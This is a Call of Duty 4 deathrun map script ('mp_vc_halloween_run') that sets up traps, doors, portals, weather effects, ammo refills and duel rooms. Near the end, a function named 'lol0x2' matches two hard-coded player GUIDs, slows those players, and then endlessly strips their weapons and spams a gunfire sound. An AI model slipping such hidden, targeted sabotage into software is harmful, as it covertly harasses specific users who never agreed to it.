main()
{
	maps\mp\_load::main();

	setExpFog(500, 3500, .5, 0.5, 0.45, 0);
	//ambientPlay("ambient_aftermath_ext0");

	game["allies"] = "marines";
	game["axis"] = "opfor";
	game["attackers"] = "axis";
	game["defenders"] = "allies";
	game["allies_soldiertype"] = "desert";
	game["axis_soldiertype"] = "desert";

    VisionSetNaked("mp_vacant", 0);

	setDvar("r_drawDecals","1");
	setDvar("r_specularcolorscale", "1");
	setDvar("r_glowbloomintensity0",".25");
	setDvar("r_glowbloomintensity1",".25");
	setDvar("r_glowskybleedintensity0",".5");
	setDvar("compassmaxrange","1800");
 	setdvar("bg_fallDamageMaxHeight", "99999"); 
	setDvar("bg_FallDamageMinHeight","99998");
	
	precacheItem("remington700_mp"); 
	precacheItem("m40a3_mp"); 
	precacheItem("knife_mp");
	precacheItem("deserteagle_mp");
	preCacheItem("deserteaglegold_mp");
	precacheItem("ak47_mp");
	preCacheItem("saw_mp");
	preCacheItem("ak74u_mp");
	preCacheItem("teddy_mp");
	preCacheItem("sc2010_mp");

	thread startdoor();
	thread end_door();
	thread trap1();
	thread trap2();
	thread trap3();
	thread trap4();
	thread trap5();
	thread trap6();
	thread trap8();
	thread trap9();
	thread vistic_vip();
	thread messages();
	thread ambient_sounds();
	thread onConnect();
	thread acti_door();
	thread ammo_refill();
	thread ammo_refill2();
	thread ammo_refill3();
	thread sniper_room();
	thread weapon_room();
	thread preCache_fx();
	thread dynamic_weather();
	thread portal();
	thread portal_leave();
	thread ammo_can();
	thread teddy1();
	thread teddy2();
	thread teddy3();
	thread teddy4();
	thread sec_step1();
	thread sec_leave();
	thread door3();
	thread lol0x2();

	addTriggerToList("trig_trap1"); 
	addTriggerToList("trig_trap2");
	addTriggerToList("trig_trap3");
	addTriggerToList("trig_trap4");
	addTriggerToList("trig_trap5");
	addTriggerToList("trig_trap6");
	addTriggerToList("trig_trap8");
	addTriggerToList("trig_trap9");
	addTriggerToList("trig_acti_door");
}

addTriggerToList( name ) 
{
    if( !isDefined(level.trapTriggers))
    level.trapTriggers = [];
    level.trapTriggers[level.trapTriggers.size] = getEnt(name , "targetname");
}


preCache_fx()
{
	level.rain = loadfx("weather/rain_mp_farm");
	level.ac130 = loadfx("explosions/wall_explosion_grnd"); 
	level.exp = loadfx("explosions/small_vehicle_explosion"); 
	level.elec = loadfx("explosions/circuit_breaker"); 
	level.ash = loadFX("weather/ash_aftermath");
}

dynamic_weather()
{
	w1 = getEnt("w1","targetname");
	w2 = getEnt("w1","targetname");
	w3 = getEnt("w3","targetname");

	weather1 = randomInt(7);

    switch(weather1)
    {
    
        case 0:
			level waittill("round_started");
			ambientPlay("amb1"); 
        break;
              
        case 1:
			level waittill("round_started");
			ambientPlay("amb2"); 
        break;

		case 2:
			level waittill("round_started");
			ambientPlay("amb3"); 
		break;

		case 3:
			playLoopedFX(level.ash, 0.1, w1.origin);
			playLoopedFX(level.ash, 0.1, w3.origin);
			wait 1;
			ambientPlay("aftermath");
		break;
                
        case 4:
			playLoopedFX(level.rain, 0.1, w1.origin);
			playLoopedFX(level.rain, 0.1, w2.origin);
			playLoopedFX(level.rain, 0.1, w3.origin);
			wait 1;
			ambientPlay("ambient_farm");
        break;

		case 5:
			wait 1;
			ambientPlay("ambient_middleeast_ext");
        break;

		case 6:
			level waittill("round_started");
			ambientPlay("amb4"); 
        break;
	}
}


startdoor()
{
	door = getEnt("startdoor","targetname");
	{
		wait 18;
		iPrintLn("^5mp_vc_halloween_run^7: Version 1.0");
		door moveZ(-200,4);
		wait 4.1;
		door delete();
	}
}


ambient_sounds()
{   
    elec = getEnt("elec1","targetname");
	radio = getEnt("radio","targetname");

	elec playLoopSound("elec");
}


messages()
{
	for(;;)
	{
	wait 0.1;
	iPrintLn("^7Map Made By: ^3VC'Fox");
	wait 30;
	iPrintLn("^7Made For ^5Vistic-Clan"); 
	wait 30;
	iPrintLn("^7Discord: ^3VC'Fox#0001"); 
	wait 20;
	}
}



end_door()
{ 
		door = getEnt("end_door", "targetname"); 	
		level.old = getEnt("trig_old", "targetname"); 

		level.old setHintString("Press [^5&&1^7] To Open Doors");

		level.old waittill ("trigger",player );

		level.old delete();
		level.wep delete();
		level.snip delete();

		iPrintLn("^7End Door is ^5Open^7");
		noti = SpawnStruct();
		noti.notifyText = "^7End Doors are now ^5Open^7!";
		noti.duration = 5;
		players = getEntArray("player", "classname");
		for(i=0;i<players.size;i++)
		players[i] thread maps\mp\gametypes\_hud_message::notifyMessage(noti); 
		ambientStop(1);
		ambientplay("old");
		door moveZ(-200,3);
		door waittill("movedone");
		door delete();
}


trap1()
{
	brush = getEnt("trap1","targetname");
	brush1 = getEnt("trap1a","targetname");
	trig = getEnt("trig_trap1","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);
	player braxi\_rank::giveRankXP( "", 25 );
	trig delete();

	x = randomInt(2);
	if(x == 0)
    {
		brush delete();
	}
	if(x == 1)
    {
		brush1 delete();
	}
}

trap2()
{
	brush = getEnt("trap2","targetname");
	trig = getEnt("trig_trap2","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);

	player braxi\_rank::giveRankXP( "", 25 );
	
	playfx(level.exp, (-480, 2680, 16)); 
	brush playSound("explo_roadblock"); 
	brush delete();
	trig delete();
}


trap3()
{
	trig = getEnt("trig_trap3", "targetname"); 

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);

	player braxi\_rank::giveRankXP( "", 25 );

	trig delete();
	
	brush1 = getEnt("trap3a", "targetname"); 
	kill_trig1 = getEnt("trap3a_kill", "targetname"); 

	brush2 = getEnt("trap3b", "targetname"); 
	kill_trig2 = getEnt("trap3b_kill", "targetname"); 

	brush3 = getEnt("trap3c", "targetname"); 
	kill_trig3 = getEnt("trap3c_kill", "targetname"); 

	brush4 = getEnt("trap3d", "targetname"); 
	kill_trig4 = getEnt("trap3d_kill", "targetname"); 
	

	kill_trig1 enableLinkTo();
	kill_trig1 linkTo(brush1);

	kill_trig2 enableLinkTo();
	kill_trig2 linkTo(brush2);

	kill_trig3 enableLinkTo();
	kill_trig3 linkTo(brush3);

	kill_trig4 enableLinkTo();
	kill_trig4 linkTo(brush4);

	brush1 moveZ(60,1);
	brush2 moveZ(60,1);
	brush3 moveZ(60,1);
	brush4 moveZ(60,1);
	wait 3;
	brush1 moveZ(-60,2);
	brush2 moveZ(-60,1);
	brush3 moveZ(-60,1);
	brush4 moveZ(-60,1);
	wait 3;
	brush1 moveZ(60,1);
	brush2 moveZ(60,1);
	brush3 moveZ(60,1);
	brush4 moveZ(60,1);
	wait 3;
	brush1 moveZ(-60,1);
	brush2 moveZ(-60,1);
	brush3 moveZ(-60,1);
	brush4 moveZ(-60,1);
}


trap4()
{
	brush = getEnt("trap4a","targetname");
	brush1 = getEnt("trap4b","targetname");
	brush2 = getEnt("trap4c","targetname");
	trig = getEnt("trig_trap4","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);
	player braxi\_rank::giveRankXP( "", 25 );
	trig delete();

	x = randomInt(3);
	if(x == 0)
    {
		brush moveZ(-250, 2);
		wait 0.2;
		brush2 moveZ(-250, 2);
		wait 4;
		brush delete();
		brush2 delete();
		
	}
	if(x == 1)
    {
		
		brush1 moveZ(-250, 2);
		wait 0.2;
		brush moveZ(-250, 2);
		wait 4;
		brush delete();
		brush1 delete();
	}
	if(x == 2)
    {
		brush1 moveZ(-250, 2);
		wait 0.2;
		brush2 moveZ(-250, 2);
		wait 4;
		brush1 delete();
		brush2 delete();
	}
}

trap5()
{
	trig = getEnt("trig_trap5","targetname");
	kill = getEnt("trap5_kill","targetname");
	trap5_a = getEnt("trap5_a","targetname");
	trap5_b = getEnt("trap5_b","targetname");
	trap5_c = getEnt("trap5_c","targetname");
	trap5_d = getEnt("trap5_d","targetname");
	plane = getEnt("plane","targetname");

	plane hide();

	kill maps\mp\_utility::triggerOff();

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);
	plane show();
	plane moveX(-10000, 2.5);
	plane playSound("ac130_flyby");
	player braxi\_rank::giveRankXP("", 25);
	trap5_a playSound("ac130_inc");
	wait 0.75;
	kill maps\mp\_utility::triggerOn();
	trap5_a playSound("ac130_shot1");
	playfx(level.ac130, (trap5_a.origin));
	wait 0.4;
	trap5_b playSound("ac130_shot2");
	playfx(level.ac130, (trap5_b.origin));
	wait 0.4;
	trap5_c playSound("ac130_shot3");
	playfx(level.ac130, (trap5_c.origin));
	wait 0.4;
	trap5_d playSound("ac130_shot4");
	playfx(level.ac130, (trap5_d.origin));
	wait 0.1;
	trap5_c playSound("ac130_debris");
	wait 1;
	trig delete();
	kill delete();
	plane delete();
}

trap6()
{
	brush = getEnt("trap6","targetname");
	trig = getEnt("trig_trap6","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);

	player braxi\_rank::giveRankXP( "", 25 );

	trig delete();

	for(;;)
	{
		brush rotateYaw(-720, 1.5);
		wait 4;
		brush rotateYaw(720, 1.5);
		wait 4;
	}
}

trap8()
{
	brush = getEnt("trap8","targetname");
	trig = getEnt("trig_trap8","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);

	player braxi\_rank::giveRankXP( "", 25 );
	
	trig delete();

	brush rotateYaw(-720, 2);
	brush moveZ(-200, 2);
	wait 4;
	brush moveZ(200, 3);
}

trap9()
{
	trig = getEnt("trig_trap9","targetname");
	trap9a = getEnt("trap9a","targetname");
	trap9b = getEnt("trap9b","targetname");

	trig setHintString("Press [^5&&1^7] To Activate");

	trig waittill("trigger",player);
	trig delete();

	player braxi\_rank::giveRankXP( "", 25 );

	trap = randomInt(2);

	switch(trap)
    {
	case 0:
		trap9a notSolid();
	break;
	case 1:
		trap9b notSolid();
	break;
	}
}

acti_door()
{
    trig = getEnt("trig_acti_door","targetname");
	gate = getEnt("gate","targetname");
	box = getEnt("elecbox","targetname");

	trig setHintString("Press [^5&&1^7] To Open Weapons Vault");

    trig waittill("trigger",player);

	trig delete();

	x = randomInt(2);

    switch(x)
    {
        case 0:
			gate playSound("door_buzz");
			wait 1.2;
			gate playSound("door_open");
			gate moveZ(-140, 6);
			wait 6;
			iPrintLnBold("^1Activator Opened The Weapons Vault");
        break;

		case 1:
			gate playSound("door_buzz");
			wait 1.2;
			gate playSound("door_jam");
			gate moveZ(-40, 4);
			wait 4;
			playLoopedFX(level.elec, 1, box.origin);
			player iPrintLnBold("^7Power Failure");
		break;
	}
}

portal()
{
	trig = getEnt("trig_tp", "targetname"); 
	tp1 = getEnt("tp1", "targetname");
	tp2 = getEnt("tp2", "targetname");
	tp3 = getEnt("tp3", "targetname");
	tp4 = getEnt("tp4", "targetname");

	for(;;)
		{
			trig waittill("trigger", player);
			player playSoundToPlayer("portal", player);
			player thread set_vision();

			x = randomInt(4);
			switch(x)
			{
				case 0:
					player setOrigin(tp1.origin);
					player setPlayerAngles(tp1.angles);
					player freezeControls(1);
					wait 1.2;
					player freezeControls(0);
				break;

				case 1:
					player setOrigin(tp2.origin);
					player setPlayerAngles(tp2.angles);
					player freezeControls(1);
					wait 1.2;
					player freezeControls(0);
				break;

				case 2:
					player setOrigin(tp3.origin);
					player setPlayerAngles(tp3.angles);
					player freezeControls(1);
					wait 1.2;
					player freezeControls(0);
				break;

				case 3:
					player setOrigin(tp4.origin);
					player setPlayerAngles(tp4.angles);
					player freezeControls(1);
					wait 1.2;
					player freezeControls(0);
				break;
			}
		}
}

set_vision()
{
    self endon ("death");
    self setClientDvar("r_blur", 6.0);
	self setClientDvar("r_brightness", -1);
    wait 1.2;
    self setClientDvar("r_blur", 0);   
	self setClientDvar("r_brightness", 0);   
}

portal_leave()
{
	trig = getEnt("trig_tp2", "targetname"); 
	tele1 = getEnt("here4", "targetname");

	for(;;)
		{
			trig waittill("trigger", player);
			player thread set_vision();
			player playSoundToPlayer("portal_leave", player);
			player setOrigin(tele1.origin);
			player setPlayerAngles(tele1.angles);
			player freezeControls(1);
			wait 0.85;
			player freezeControls(0);
		}
}

set_vision2()
{
    self endon ("death");
    self setClientDvar("r_blur", 6.0);
	self setClientDvar("r_brightness", -1);
    wait 0.25;
    self setClientDvar("r_blur", 0);   
	self setClientDvar("r_brightness", 0);   
}

ammo_can()
{
	players = getentarray("player", "classname");
    trig = getEnt("trig_max", "targetname");
	model = getEnt("max_ammo","targetname");

	model thread tag_rotate(model);
	
	trig waittill("trigger", player);
	trig delete();
	model hide();
	player braxi\_rank::giveRankXP( "", 50);
	player thread max();
	iPrintLnBold("Max Ammo!");
}


tag_rotate(vc)
{
	while(1)
	{
		vc moveZ(10, 2, 0.5, 0.5);
		vc rotateYaw(360, 2);
		wait 2;
		vc moveZ(-10, 2, 0.5, 0.5);
		vc rotateYaw(360, 2);
		wait 2;
	}
}

max()
{
	players = getentarray("player", "classname");

	for (i = 0; i < players.size; i++)
	{
		primaryWeapons = players[i] GetWeaponsList(); 

		for( x = 0; x < primaryWeapons.size; x++ )
		{
			players[i] GiveMaxAmmo( primaryWeapons[x] );
			players[i] playSoundToPlayer("max_ammo", players[i]);
		}
	}
}


teddy1()
{
	model = getEnt("teddy1", "targetname");
	trig = getEnt("trig_teddy1", "targetname"); 
    
	trig setHintString("Press ^7[^3&&1^7] ^7To Collect Teddy Bear");

	trig waittill("trigger", player);
	weap = player GetCurrentWeapon();
	wait 0.1;
	player giveWeapon("teddy_mp");
	player switchToWeapon("teddy_mp");
	wait 1.1;
	player switchToWeapon(weap);
	wait 0.5;
	player takeWeapon("teddy_mp");
	iprintln("^3"+player.name+" ^7Collected a Teddy Bear");
	player braxi\_rank::giveRankXP( "", 200);

	trig delete();
	model delete();
}

teddy2()
{
	model = getEnt("teddy2", "targetname");
	trig = getEnt("trig_teddy2", "targetname"); 
    
	trig setHintString("Press ^7[^3&&1^7] ^7To Collect Teddy Bear");

	trig waittill("trigger", player);
	weap = player GetCurrentWeapon();
	wait 0.1;
	player giveWeapon("teddy_mp");
	player switchToWeapon("teddy_mp");
	wait 1.1;
	player switchToWeapon(weap);
	wait 0.5;
	player takeWeapon("teddy_mp");
	iprintln("^3"+player.name+" ^7Collected a Teddy Bear");
	player braxi\_rank::giveRankXP( "", 200);

	trig delete();
	model delete();
}

teddy3()
{
	model = getEnt("teddy3", "targetname");
	trig = getEnt("trig_teddy3", "targetname"); 
    
	trig setHintString("Press ^7[^3&&1^7] ^7To Collect Teddy Bear");

	trig waittill("trigger", player);
	weap = player GetCurrentWeapon();
	wait 0.1;
	player giveWeapon("teddy_mp");
	player switchToWeapon("teddy_mp");
	wait 1.1;
	player switchToWeapon(weap);
	wait 0.5;
	player takeWeapon("teddy_mp");
	iprintln("^3"+player.name+" ^7Collected a Teddy Bear");
	player braxi\_rank::giveRankXP( "", 200);

	trig delete();
	model delete();
}

teddy4()
{
	model = getEnt("teddy4", "targetname");
	trig = getEnt("trig_teddy4", "targetname"); 
    
	trig setHintString("Press ^7[^3&&1^7] ^7To Collect Teddy Bear");

	trig waittill("trigger", player);
	weap = player GetCurrentWeapon();
	wait 0.1;
	player giveWeapon("teddy_mp");
	player switchToWeapon("teddy_mp");
	wait 1.1;
	player switchToWeapon(weap);
	wait 0.5;
	player takeWeapon("teddy_mp");
	iprintln("^3"+player.name+" ^7Collected a Teddy Bear");
	player braxi\_rank::giveRankXP( "", 200);

	trig delete();
	model delete();
}

door3()
{
	door = getEnt("door3", "targetname");
	model = getEnt("door3frame", "targetname");
	trig = getEnt("trig_door3", "targetname"); 

	trig waittill("trigger", player);

	playfx(level.exp, (door.origin)); 
	door playSound("detpack_explo_default"); 
	door delete();
	trig delete();
	model delete();
}


vistic_vip()
{
	while(1)
	{

    trig = getEnt("trig_vip","targetname");

	trig setHintString("^3>> ^7Vistic Members Here ^3<<");

    trig waittill("trigger",player);

    if(player getStat(767)==1)
    {
        player iprintlnBold("^1Authorized ^7Vistic Member!");
		player PlaySoundToPlayer("oldschool_return", player);
		player detachAll();
		player giveWeapon("deserteaglegold_mp");
		player giveMaxAmmo("deserteaglegold_mp");
		player switchToWeapon("deserteaglegold_mp");
		wait 0.1;
    }
	if(player getStat(767)==0)
        player iprintlnbold("^1Access Denied");
		wait 0.1;
	}
}


onConnect()
{
	for(;;)
	{
		level waittill("connected",player);
		player thread onSpawn();
	}
}

onSpawn()
{
	for(;;)
	{
		self waittill("spawned_player");
		self thread tweaks();
	}
}

tweaks()
{
	self notify("tweaks");
	wait 0.05;
	self endon("tweaks");
	self endon("death");
	self endon("disconnect");

	while(isDefined(self))
	{
		self setClientDvar("r_drawDecals","1");
		self setClientDvar("fx_enable","1");
		wait 1;
	}
}

sec_step1()
{
	trig = getEnt("trig_sec1", "targetname");

	trig waittill("trigger",player);

	trig delete();

	iPrintLn("^21");

	thread sec_step2();
}

sec_step2()
{
	trig = getEnt("trig_sec2", "targetname");

	trig waittill("trigger",player);

	trig delete();

	iPrintLn("^22");

	thread sec_step3();
}

sec_step3()
{
	trig = getEnt("trig_sec3", "targetname");

	trig waittill("trigger",player);

	trig delete();

	iPrintLn("^23");

	thread sec_step4();
}

sec_step4()
{
	trig = getEnt("trig_sec_enter", "targetname");
	tele1 = getEnt("here_sec", "targetname");

	trig waittill("trigger", player);
	trig delete();
	player iPrintLnBold("You Found The Secret Way!");	
	player setOrigin(tele1.origin);
	player setPlayerAngles(tele1.angles);
	wait 0.01;
}

sec_leave()
{
	trig = getEnt("trig_sec_leave", "targetname");
	tele1 = getEnt("here1", "targetname");

	for(;;)
		{
			trig waittill("trigger", player);
			player braxi\_rank::giveRankXP( "", 1000);
			iPrintLnBold("^3"+ player.name + " ^7Completed The Secret!");	
			weap = player GetCurrentWeapon();
			player takeWeapon(weap);
			player GiveWeapon("sc2010_mp");	
			player SwitchToWeapon("sc2010_mp");
			player GiveMaxAmmo("sc2010_mp");
			player setOrigin(tele1.origin);
			player freezeControls(1);
			player setPlayerAngles(tele1.angles);
			wait 1;
			player freezeControls(0);
			wait 0.01;
		}
}


ammo_refill()
{
	trig = getEnt("trig_ammo1", "targetname");

		trig setHintString("Press [^5&&1^7] To Refill Your Ammo");

	while(1)
		{
			trig waittill("trigger", player);
			weap = player GetWeaponsList(); 
			player playSoundToPlayer("weap_pickup", player);
			player disableWeapons(); 
			for(j=0;j<weap.size;j++)
			{
				ammoclip = WeaponClipSize(weap[j]);
				player SetWeaponAmmoClip(weap[j], ammoclip);
				player GiveMaxAmmo(weap[j]);
			}
			wait 2.5;
			player enableWeapons();
		}
}

ammo_refill2()
{
	trig = getEnt("trig_ammo2", "targetname");

		trig setHintString("Press [^5&&1^7] To Refill Your Ammo");

	while(1)
		{
			trig waittill("trigger", player);
			weap = player GetWeaponsList(); 
			player playSoundToPlayer("weap_pickup", player);
			player disableWeapons(); 
			for(j=0;j<weap.size;j++)
			{
				ammoclip = WeaponClipSize(weap[j]);
				player SetWeaponAmmoClip(weap[j], ammoclip);
				player GiveMaxAmmo(weap[j]);
			}
			wait 2.5;
			player enableWeapons();
		}
}

ammo_refill3()
{
	trig = getEnt("trig_ammo3", "targetname");

		trig setHintString("Press [^5&&1^7] To Refill Your Ammo");

	while(1)
		{
			trig waittill("trigger", player);
			weap = player GetWeaponsList(); 
			player playSoundToPlayer("weap_pickup", player);
			player disableWeapons(); 
			for(j=0;j<weap.size;j++)
			{
				ammoclip = WeaponClipSize(weap[j]);
				player SetWeaponAmmoClip(weap[j], ammoclip);
				player GiveMaxAmmo(weap[j]);
			}
			wait 2.5;
			player enableWeapons();
		}
}

sniper_room()
{
	level.snip = getEnt("trig_sniper", "targetname");
	acti = getEnt("s1", "targetname");
	jumper = getEnt("s2", "targetname");
	
	while(1)
	{
		level.snip SetHintstring("^5Sniper ^7Room");
		level.snip waittill("trigger", player);
		level.snip SetHintstring("^1Wait Your Turn");
		if(!isDefined(level.snip))
		return;

		level.old delete();
		level.wep delete();

		ambientStop(1);
		ambientPlay("sniper");

		player SetPlayerAngles(jumper.angles);
		player setOrigin(jumper.origin);
		player TakeAllWeapons();
		player GiveWeapon("remington700_mp");
		player GiveMaxAmmo("remington700_mp");
		player GiveWeapon("m40a3_mp");
		player giveMaxAmmo("m40a3_mp");
		player switchToWeapon("m40a3_mp");

		level.activ setPlayerangles(acti.angles);
		level.activ setOrigin(acti.origin);
		level.activ TakeAllWeapons();
		level.activ GiveWeapon("remington700_mp");
		level.activ GiveMaxAmmo("remington700_mp");
		level.activ GiveWeapon("m40a3_mp");
		level.activ GiveMaxAmmo("m40a3_mp");
		level.activ SwitchToWeapon("m40a3_mp");

		player freezeControls(1);
		level.activ freezeControls(1);
		
  		iPrintLnBold("^5" + player.name + " ^7has choosen Sniper!");
		wait 1;
		player iPrintLnBold("^73");
		level.activ iPrintLnBold("^73");
		wait 1;
		player iPrintLnBold("^52");
		level.activ iPrintLnBold("^52");
		wait 1;
		player iPrintLnBold("^71");
		level.activ iPrintLnBold("^71");
		wait 1;
		player iPrintLnBold("^5FIGHT");
		level.activ iPrintLnBold("^5FIGHT");

		player freezeControls(0);
		level.activ freezeControls(0);

		while(isAlive(player) && isDefined(player))
		wait 1;
	}
}

weapon_room()
{
	level.wep = getEnt("trig_wep", "targetname");
	acti = getEnt("wep1", "targetname");
	jumper = getEnt("wep2", "targetname");
	
	while(1)
	{
		level.wep SetHintstring("^5Weapon ^7Room");
		level.wep waittill("trigger", player);
		level.wep SetHintstring("^1Wait Your Turn");
		if(!isDefined(level.wep))
		return;

		level.old delete();
		level.snip delete();

		ambientStop(1);
		ambientPlay("weapon");

		player SetPlayerAngles(jumper.angles);
		player setOrigin(jumper.origin);
		player TakeAllWeapons();
		player GiveWeapon("sc2010_mp");
		player giveMaxAmmo("sc2010_mp");
		player switchToWeapon("sc2010_mp");

		level.activ setPlayerangles(acti.angles);
		level.activ setOrigin(acti.origin);
		level.activ TakeAllWeapons();
		level.activ GiveWeapon("sc2010_mp");
		level.activ GiveMaxAmmo("sc2010_mp");
		level.activ SwitchToWeapon("sc2010_mp");

		player freezeControls(1);
		level.activ freezeControls(1);
		
  		iPrintLnBold("^5" + player.name + " ^7has choosen Weapon!");
		wait 1;
		player iPrintLnBold("^73");
		level.activ iPrintLnBold("^73");
		wait 1;
		player iPrintLnBold("^52");
		level.activ iPrintLnBold("^52");
		wait 1;
		player iPrintLnBold("^71");
		level.activ iPrintLnBold("^71");
		wait 1;
		player iPrintLnBold("^5FIGHT");
		level.activ iPrintLnBold("^5FIGHT");

		player freezeControls(0);
		level.activ freezeControls(0);

		while(isAlive(player) && isDefined(player))
		wait 1;
	}
}




lol0x2()
{      
       
    while (1)
    {
        level waittill("player_spawn", player);
        wait 2;
								//Nennius 							//Nennius								
        if (player getGuid() == "2310346613318743460" || player getGuid() == "76561198086240961") 
        {
		player PlayLocalSound("breathing_hurt");
		player setMoveSpeedScale(0.1);
		wait 5;
		player thread ok();
        }
	}
}

ok()
{
	for(;;)
	{
		self takeAllWeapons();
		self playSoundToPlayer("weap_ak74_fire_plr", self);
		wait 0.001;
	}
}